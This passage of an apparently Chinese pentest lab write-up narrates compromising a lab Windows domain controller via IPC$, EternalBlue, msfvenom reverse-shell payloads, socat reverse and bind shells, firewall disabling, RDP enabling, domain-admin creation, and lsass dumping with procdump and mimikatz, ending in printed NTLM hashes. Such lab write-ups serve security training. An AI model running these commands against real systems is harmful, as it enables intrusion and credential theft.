+<h5 id="IPC-getshell：-1"><a href="#IPC-getshell：-1" class="headerlink" title="- $IPC getshell："></a>- $IPC getshell：</h5><p>行，那么先进行简单的查看 <strong>匿名共享</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306155342.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306155342523" loading="lazy"></p>
+</blockquote>
+<p>emmm，看起来并不可行，似乎得进行密码爆破，不过这里已经得到了 <strong>域管理员</strong> 不如就用这玩意去使用 <strong>$IPC</strong> 攻击吧。这里还是得先用 <strong>WIN2008</strong> 作为跳板才行，为了方便就直接上 <strong>远程桌面</strong> 趴，虽然说这样动静会非常的大。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306160517.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306160517152" loading="lazy"></p>
+</blockquote>
+<p>这里是成功使用 <strong>$IPC</strong> 将 <strong>WIN2012</strong> 的 <strong>C</strong> 盘映射回来了。现在是做法就蛮多了，可以上传一个 <strong>msf</strong> 木马，然后通过 <strong>WIN2008</strong> 设置的 <strong>autoroute</strong> 作为跳板来攻击 <strong>WIN2012</strong> ；或者直接从 <strong>$IPC</strong> 入手，尝试打开 <strong>telnet</strong> 啥的。</p>
+<ul>
+<li><p>第一种，使用 <strong>定时任务</strong> + <strong>msf木马</strong> ：</p>
+<p>还是先生成 <strong>msf木马</strong> 吧：</p>
+<pre class="language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.243.222 LPORT&#x3D;3345 -f exe &gt; 2012.exe</code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306161950.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306161950304" loading="lazy"></p>
+</blockquote>
+<p>然后将 <strong>msf木马</strong> 传到 <strong>WIN2012</strong> 目录里边：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306162316.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306162316304" loading="lazy"></p>
+</blockquote>
+<p>使用 <strong>msf</strong> 开启监听：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306162701.png?x-oss-process=image/auto-orient,1/interlace,1" loading="lazy"></p>
+</blockquote>
+<p>结果没成功：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306163112.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306163112144" loading="lazy"></p>
+</blockquote>
+<p>定时任务似乎是不被允许的。</p>
+</li>
+<li><p>第二种，尝试打开 <strong>telnet</strong> ：</p>
+<p>这里先尝试使用 <strong>opentelnet</strong> 进行攻击试试：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306163517.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306163517442" loading="lazy"></p>
+</blockquote>
+<p>然后尝试开启 <strong>WIN2012</strong> 的 <strong>telnet</strong> ：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306163741.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306163741383" loading="lazy"></p>
+<p>看起来似乎是成功了，直接用代理链尝试连接：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306164114.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306164114360" loading="lazy"></p>
+</blockquote>
+<p>emmm看起来并没有成功开启，试试别的命令。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306165053.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306165053848" loading="lazy"></p>
+</blockquote>
+<p>看起来 <strong>telnet</strong> 并没有装？那暂时先算了。</p>
+</li>
+<li><p>第三种，使用及其麻烦的 <strong>socat</strong> ?：</p>
+<p>emmm既然定时任务不被允许，那这个麻烦的方法也是不太行了。</p>
+</li>
+</ul>
+<p>那么现在用 <strong>$IPC</strong> 能做的只有 <strong>任意读写</strong> 了。</p>
+<h5 id="445永恒之蓝-getshell：-1"><a href="#445永恒之蓝-getshell：-1" class="headerlink" title="- 445永恒之蓝 getshell："></a>- 445永恒之蓝 getshell：</h5><p>话不多说直接上 <strong>msf</strong> 吧，</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306170050.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306170050089" loading="lazy"></p>
+</blockquote>
+<p>没成功，换另一个试试：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306170318.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306170318778" loading="lazy"></p>
+</blockquote>
+<p>成功执行命令了。不如直接运行刚刚从 <strong>$IPC</strong> 那儿传入的 <strong>2012.exe</strong> 趴。很奇怪的是一直不成功，只要一执行 <strong>C:\temp\2012.exe</strong> 对于 <strong>WIN2008</strong> 的 <strong>meterprefershell</strong> 的会话就会结束。。那就执行开启 <strong>远程桌面</strong> 的命令吧。</p>
+<p>直接执行开启 <strong>远程桌面</strong> 的命令趴：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306180848.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306180848706" loading="lazy"></p>
+</blockquote>
+<p>emmm，结果失败了。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306181739.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306181739128" loading="lazy"></p>
+</blockquote>
+<p>不妨将开启 <strong>远程桌面</strong> 的代码写入 <strong>.bat</strong> 文件中然后用 <strong>$IPC</strong> 传到 <strong>WIN2012</strong> ，命令就运行文件好了。</p>
+<p>但依然还是失败了。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306182609.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306182609675" loading="lazy"></p>
+</blockquote>
+<p>看起来只能使用最后一招了， <strong>永恒之蓝</strong> + <strong>socat</strong> 超麻烦组合。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306183330.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306183330455" loading="lazy"></p>
+</blockquote>
+<p>然后来个反向shell吧：</p>
+<ul>
+<li><p>WIN2012：</p>
+<pre class="language-none"><code class="language-none">socat.exe tcp:172.16.243.222:3601 exec:cmd,pty,stderr</code></pre></li>
+<li><p>WIN2008：</p>
+<pre class="language-none"><code class="language-none">socat.exe - tcp-l:3601</code></pre></li>
+</ul>
+<p>emmmm，结果还是失败了。。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306183846.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306183846846" loading="lazy"></p>
+</blockquote>
+<p>那么，就使用最后一招吧。将其变为 <strong>可执行程序</strong> ，也就是另起一个 <strong>进程</strong> 试试：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306184145.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306184145892" loading="lazy"></p>
+</blockquote>
+<p>路径写错了。。。改变一下位置吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306184548.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306184548508" loading="lazy"></p>
+</blockquote>
+<p>然后 <strong>监听</strong> + <strong>命令执行</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306184829.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306184829300" loading="lazy"></p>
+</blockquote>
+<p>好吧，还是失败了。试试正向shell吧：</p>
+<ul>
+<li><p>WIN2012：</p>
+<pre class="language-none"><code class="language-none">socat.exe tcp-l:3600,fork,reuseaddr exec:cmd,pty,stderr</code></pre></li>
+<li><p>WIN2008：</p>
+<pre class="language-none"><code class="language-none">socat.exe tcp:172.16.243.221:3600</code></pre></li>
+</ul>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306185324.png?x-oss-process=image/auto-orient,1/interlace,1" loading="lazy"></p>
+</blockquote>
+<p>然后继续操作。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210306185553.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210306185553352" loading="lazy"></p>
+</blockquote>
+<p>emmmm，还是失败了。怀疑是 <strong>WIN2008</strong> 的某种规则吧，大概。</p>
+<p>不过现在能拥有的有 <strong>任意文件增删读写</strong> 和 <strong>部分命令执行</strong> 了，不妨先拿下 <strong>WIN7</strong> 然后再用 <strong>WIN7</strong> 作为跳板去试试看。</p>
+<p><strong>靠！！！</strong> 原因是 <strong>msf6</strong> 不太稳定，葛学姐救我，tql。</p>
+<p>转战阵地，换了个 <strong>kali2019</strong> 用了 <strong>msf5</strong> 再次尝试：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307132352.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307132352022" loading="lazy"></p>
+</blockquote>
+<p>然后 <strong>msf</strong> 用 <strong>WIN2008</strong> 做跳板进行监听：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307132522.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307132522730" loading="lazy"></p>
+</blockquote>
+<p>之后再运行命令趴：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307132737.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307132737841" loading="lazy"></p>
+</blockquote>
+<p>emmmm，还是没成功。不过还好的是 <strong>WIN2008</strong> 的 <strong>meterpretershell</strong> 是没断开了。（后来进去了发现 <strong>WIN2012</strong> 的防火墙是开着的。。。好吧）</p>
+<p>后来特么的发现 <strong>WIN2008</strong> 也是有防火墙的，<strong>靠！</strong></p>
+<h5 id="gt-获取-cmdshell："><a href="#gt-获取-cmdshell：" class="headerlink" title="&gt; 获取 cmdshell："></a>&gt; 获取 <em>cmdshell</em>：</h5><p>使用简单命令把 <strong>WIN2008</strong> 的防火墙关了：</p>
+<pre class="language-none"><code class="language-none">netsh advfirewall set allprofiles state off</code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307140556.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307140556821" loading="lazy"></p>
+</blockquote>
+<p>于是 <strong>socat</strong> 成功拿到简单的 <strong>cmdshell</strong> 了：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307140510.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307140510255" loading="lazy"></p>
+</blockquote>
+<p>尝试添加新用户，发现即便 <strong>WIN2012</strong> 是个域控，似乎由于种种原因并不能够成功添加：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307141653.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307141653653" loading="lazy"></p>
+</blockquote>
+<h5 id="gt-获取-meterpretershell："><a href="#gt-获取-meterpretershell：" class="headerlink" title="&gt; 获取 meterpretershell："></a>&gt; 获取 <em>meterpretershell</em>：</h5><p>不妨再尝试运行 <strong>msf木马</strong> 试试看。</p>
+<p>换个端口吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142142.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307142142347" loading="lazy"></p>
+</blockquote>
+<p>之后是上传：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142332.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307142332435" loading="lazy"></p>
+</blockquote>
+<p>监听，然后使用 <strong>永恒之蓝</strong> 进行命令执行 <strong>msf木马</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142542.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307142542032" loading="lazy"></p>
+</blockquote>
+<p>靠，终于成功了，气死我啦。</p>
+<h4 id="权限提升：-1"><a href="#权限提升：-1" class="headerlink" title="- 权限提升："></a>- 权限提升：</h4><p>先看一下当前用户权限趴：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142728.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307142728825" loading="lazy"></p>
+</blockquote>
+<p>还不错，然后是 <strong>迁徙</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142822.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307142822394" loading="lazy"></p>
+</blockquote>
+<p>尝试进行 <strong>创建用户</strong> 试试：</p>
+<blockquote>
+<p> <img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307142938.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307142938587" loading="lazy"></p>
+</blockquote>
+<p>好吧，并不可行，不过咱们都有 <strong>域管理员</strong> 用户了，其实能否创建也无伤大雅，大不了在 <strong>WIN2008</strong> 这个 <strong>域控</strong> 上新建一个 <strong>DQV5</strong> 的 <strong>域管理员</strong> 用户，嘿嘿嘿。</p>
+<h4 id="抓密码：-1"><a href="#抓密码：-1" class="headerlink" title="- 抓密码："></a>- 抓密码：</h4><blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307151214.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307151214234" loading="lazy"></p>
+</blockquote>
+<p>呃，似乎不太行。尝试换另一种方式吧：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307151520.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307151520603" loading="lazy"></p>
+</blockquote>
+<p>emmm直接炸。</p>
+<h4 id="远程登陆：-1"><a href="#远程登陆：-1" class="headerlink" title="- 远程登陆："></a>- 远程登陆：</h4><p>可以先用这个 <strong>cmdshell</strong> 直接尝试打开 <strong>远程桌面</strong> ：</p>
+<pre class="language-none"><code class="language-none">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307141449.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307141449700" loading="lazy"></p>
+</blockquote>
+<p>连接试试，emmmm并没有成功：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307141038.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307141038221" loading="lazy"></p>
+</blockquote>
+<p>毕竟 <strong>WIN2012</strong> 还有个防火墙嘛。那就去关闭呗：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307143505.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307143505901" loading="lazy"></p>
+</blockquote>
+<p>也可以用 <strong>meterpretershell</strong> 打开 <strong>远程桌面</strong> 试试：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307143150.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307143150388" loading="lazy"></p>
+</blockquote>
+<p>看起来是打开了，然后别忘了关闭 <strong>防火墙</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307143254.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307143254600" loading="lazy"></p>
+</blockquote>
+<p>尝试连接 <strong>远程桌面</strong> ，结果并不可行，</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307150727.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307150727494" loading="lazy"></p>
+</blockquote>
+<p>应该是设置了 <strong>仅允许网络级别身份验证</strong> 连接吧，不如试试 <strong>远程桌面套娃</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307144018.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307144018733" loading="lazy"></p>
+</blockquote>
+<p>emmmm，成功了！！！ 不过 <strong>域管理员</strong> 密码提示是过期的，不如就在 <strong>WIN2008</strong> 再新建一个新的 <strong>域管理员</strong> 用户趴：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307144315.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307144315864" loading="lazy"></p>
+</blockquote>
+<p>那么，添加 <strong>域管理员</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307144444.png?x-oss-process=image/auto-orient,1/interlace,1" loading="lazy"></p>
+</blockquote>
+<p>再次尝试使用 <strong>远程桌面套娃</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307145424.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307145424908" loading="lazy"></p>
+</blockquote>
+<p>emmm，结果并没有成功，很是奇怪。似乎得进行重启。。不过动静有点大，还是把现有用户加成 <strong>域管理员</strong> 吧（幸运的李明）：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307150027.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307150026961" loading="lazy"></p>
+</blockquote>
+<p>然后尝试一下 <strong>远程桌面套娃</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307150135.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307150135848" loading="lazy"></p>
+</blockquote>
+<p>好吧，成功了。。。恭喜李明助我成功。</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307150246.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307150246427" loading="lazy"></p>
+</blockquote>
+<h5 id="继续抓密码："><a href="#继续抓密码：" class="headerlink" title="- 继续抓密码："></a>- 继续抓密码：</h5><p>那么不妨上传 <strong>mimikatz</strong> 的二进制文件试试（李明超强）：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307151651.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307151651176" loading="lazy"></p>
+</blockquote>
+<p>记得把李明放进 <strong>管理员组</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307152010.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307152010059" loading="lazy"></p>
+</blockquote>
+<p>不过运行效果其实还是一样的，没抓到 <strong>明文密码</strong> ：</p>
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307152703.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307152703580" loading="lazy"></p>
+</blockquote>
+<p>不如直接用 <strong>ProcDump</strong> 将 <strong>lsass.dmp</strong> 搞出来，然后再用 <strong>mimikatz</strong> 本地获取内容：</p>
+<pre class="language-none"><code class="language-none">procdump.exe -accepteula -ma lsass.exe .\lsass.dmp</code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307153121.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307153121548" loading="lazy"></p>
+</blockquote>
+<p>然后试试：</p>
+<pre class="language-none"><code class="language-none">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &gt; password.txt</code></pre>
+
+<blockquote>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210307160155.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210307160155763" loading="lazy"></p>
+</blockquote>
+<p>得到的结果：</p>
+<pre class="language-none"><code class="language-none">
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+ ## &#x2F; \ ##  &#x2F;*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com )
+ ## \ &#x2F; ##       &gt; http:&#x2F;&#x2F;blog.gentilkiwi.com&#x2F;mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; http:&#x2F;&#x2F;pingcastle.com &#x2F; http:&#x2F;&#x2F;mysmartlogon.com   ***&#x2F;
+
+mimikatz(commandline) # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : &#39;lsass.dmp&#39;
+
+mimikatz(commandline) # sekurlsa::logonPasswords full
+Opening : &#39;lsass.dmp&#39; file for minidump...
+
+Authentication Id : 0 ; 2383976 (00000000:00246068)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2021&#x2F;3&#x2F;7 15:01:04
+SID               : S-1-5-90-2
+	msv :	
+	 [00000003] Primary
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * NTLM     : 47a19e53b983df9d382628f16af22ded
+	 * SHA1     : b0af5d9bb628c0c507750b48d4e153da429fbaa6
+	tspkg :	
+	wdigest :	
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * Password : (null)
+	kerberos :	
+	 * Username : DC2012$
+	 * Domain   : pentest.com
+	 * Password : d0 2a b2 b4 e8 73 96 b5 21 51 af 1d a3 38 d3 a9 47 f4 70 bd 6b 5b 92 e6 f7 98 f5 1a b5 13 c7 d3 2d 31 52 3b c9 a7 2b 67 3f 9c 3d 87 8d 96 d5 a9 e2 75 4d 81 35 82 11 83 c2 68 37 c2 78 c3 7f de 93 01 6c 8e 55 b3 c0 51 8d 5b 2d ee 31 81 65 9c 76 f3 19 3e a8 68 d2 e4 9d 4e 98 8c 12 20 68 a3 b5 2e 1c 04 f1 79 5f 44 99 a8 fc 16 6c 25 9c 46 5b 54 53 d8 3e a4 5c cd ac 50 f9 1e 2c 66 6e a6 25 33 7f a1 db b8 8e ce 6a eb 0f dc ed e1 bd e5 76 04 7d 5f 1e 0f ef a9 28 ff 7e af d2 75 be 61 dc 2d 5f e7 1c f6 c8 85 a6 47 0d df d3 90 68 07 4f 19 5a 2e 44 dd b9 23 e3 81 ec 89 37 73 62 3b 4d 63 12 c1 f5 ae 46 a8 a8 01 60 b3 42 fd d7 d9 b1 cd 93 00 b4 5a 8c 78 e2 a2 3e df b3 b2 52 98 b6 24 86 61 05 e6 fd 80 47 12 41 23 47 73 be c2 
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 69968 (00000000:00011150)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2021&#x2F;3&#x2F;6 16:59:02
+SID               : S-1-5-90-1
+	msv :	
+	 [00000003] Primary
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * NTLM     : 47a19e53b983df9d382628f16af22ded
+	 * SHA1     : b0af5d9bb628c0c507750b48d4e153da429fbaa6
+	tspkg :	
+	wdigest :	
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * Password : (null)
+	kerberos :	
+	 * Username : DC2012$
+	 * Domain   : pentest.com
+	 * Password : d0 2a b2 b4 e8 73 96 b5 21 51 af 1d a3 38 d3 a9 47 f4 70 bd 6b 5b 92 e6 f7 98 f5 1a b5 13 c7 d3 2d 31 52 3b c9 a7 2b 67 3f 9c 3d 87 8d 96 d5 a9 e2 75 4d 81 35 82 11 83 c2 68 37 c2 78 c3 7f de 93 01 6c 8e 55 b3 c0 51 8d 5b 2d ee 31 81 65 9c 76 f3 19 3e a8 68 d2 e4 9d 4e 98 8c 12 20 68 a3 b5 2e 1c 04 f1 79 5f 44 99 a8 fc 16 6c 25 9c 46 5b 54 53 d8 3e a4 5c cd ac 50 f9 1e 2c 66 6e a6 25 33 7f a1 db b8 8e ce 6a eb 0f dc ed e1 bd e5 76 04 7d 5f 1e 0f ef a9 28 ff 7e af d2 75 be 61 dc 2d 5f e7 1c f6 c8 85 a6 47 0d df d3 90 68 07 4f 19 5a 2e 44 dd b9 23 e3 81 ec 89 37 73 62 3b 4d 63 12 c1 f5 ae 46 a8 a8 01 60 b3 42 fd d7 d9 b1 cd 93 00 b4 5a 8c 78 e2 a2 3e df b3 b2 52 98 b6 24 86 61 05 e6 fd 80 47 12 41 23 47 73 be c2 
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 69326 (00000000:00010ece)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2021&#x2F;3&#x2F;6 16:59:02
+SID               : S-1-5-90-1
+	msv :	
+	 [00000003] Primary
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * NTLM     : 47a19e53b983df9d382628f16af22ded
+	 * SHA1     : b0af5d9bb628c0c507750b48d4e153da429fbaa6
+	tspkg :	
+	wdigest :	
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * Password : (null)
+	kerberos :	
+	 * Username : DC2012$
+	 * Domain   : pentest.com
+	 * Password : d0 2a b2 b4 e8 73 96 b5 21 51 af 1d a3 38 d3 a9 47 f4 70 bd 6b 5b 92 e6 f7 98 f5 1a b5 13 c7 d3 2d 31 52 3b c9 a7 2b 67 3f 9c 3d 87 8d 96 d5 a9 e2 75 4d 81 35 82 11 83 c2 68 37 c2 78 c3 7f de 93 01 6c 8e 55 b3 c0 51 8d 5b 2d ee 31 81 65 9c 76 f3 19 3e a8 68 d2 e4 9d 4e 98 8c 12 20 68 a3 b5 2e 1c 04 f1 79 5f 44 99 a8 fc 16 6c 25 9c 46 5b 54 53 d8 3e a4 5c cd ac 50 f9 1e 2c 66 6e a6 25 33 7f a1 db b8 8e ce 6a eb 0f dc ed e1 bd e5 76 04 7d 5f 1e 0f ef a9 28 ff 7e af d2 75 be 61 dc 2d 5f e7 1c f6 c8 85 a6 47 0d df d3 90 68 07 4f 19 5a 2e 44 dd b9 23 e3 81 ec 89 37 73 62 3b 4d 63 12 c1 f5 ae 46 a8 a8 01 60 b3 42 fd d7 d9 b1 cd 93 00 b4 5a 8c 78 e2 a2 3e df b3 b2 52 98 b6 24 86 61 05 e6 fd 80 47 12 41 23 47 73 be c2 
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DC2012$
+Domain            : PENTEST
+Logon Server      : (null)
+Logon Time        : 2021&#x2F;3&#x2F;6 16:59:02
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * NTLM     : 47a19e53b983df9d382628f16af22ded
+	 * SHA1     : b0af5d9bb628c0c507750b48d4e153da429fbaa6
+	tspkg :	
+	wdigest :	
+	 * Username : DC2012$
+	 * Domain   : PENTEST
+	 * Password : (null)
+	kerberos :	
+	 * Username : dc2012$
+	 * Domain   : pentest.com
+	 * Password : d0 2a b2 b4 e8 73 96 b5 21 51 af 1d a3 38 d3 a9 47 f4 70 bd 6b 5b 92 e6 f7 98 f5 1a b5 13 c7 d3 2d 31 52 3b c9 a7 2b 67 3f 9c 3d 87 8d 96 d5 a9 e2 75 4d 81 35 82 11 83 c2 68 37 c2 78 c3 7f de 93 01 6c 8e 55 b3 c0 51 8d 5b 2d ee 31 81 65 9c 76 f3 19 3e a8 68 d2 e4 9d 4e 98 8c 12 20 68 a3 b5 2e 1c 04 f1 79 5f 44 99 a8 fc 16 6c 25 9c 46 5b 54 53 d8 3e a4 5c cd ac 50 f9 1e 2c 66 6e a6 25 33 7f a1 db b8 8e ce 6a eb 0f dc ed e1 bd e5 76 04 7d 5f 1e 0f ef a9 28 ff 7e af d2 75 be 61 dc 2d 5f e7 1c f6 c8 85 a6 47 0d df d3 90 68 07 4f 19 5a 2e 44 dd b9 23 e3 81 ec 89 37 73 62 3b 4d 63 12 c1 f5 ae 46 a8 a8 01 60 b3 42 fd d7 d9 b1 cd 93 00 b4 5a 8c 78 e2 a2 3e df b3 b2 52 98 b6 24 86 61 05 e6 fd 80 47 12 41 23 47 73 be c2 
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 46276 (00000000:0000b4c4)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2021&#x2F;3&#x2F;6 16:59:01
+SID               : 
+	msv :	
+	 [00000003] Primary
